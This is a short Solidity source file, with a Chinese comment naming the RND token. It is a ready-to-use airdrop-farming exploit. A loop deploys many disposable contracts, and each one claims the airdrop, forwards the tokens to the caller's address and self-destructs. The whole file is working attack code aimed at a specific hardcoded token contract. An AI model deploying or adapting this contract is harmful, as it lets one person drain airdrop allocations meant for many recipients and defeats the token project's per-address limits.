// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface airdrop {
    function transfer(address recipient, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function claim() external;
}
contract multiCall{
    //                                此处填写 RND 代币的合约地址
    address constant contra = address(0x1c7E83f8C581a967940DBfa7984744646AE46b29);
    function call(uint256 times) public {
        for(uint i=0;i<times;++i){
            new claimer(contra);
        }
    }
}
contract claimer{
    constructor(address contra){
        airdrop(contra).claim();
        uint256 balance = airdrop(contra).balanceOf(address(this));
        airdrop(contra).transfer(address(tx.origin), balance);
        selfdestruct(payable(address(msg.sender)));
    }
}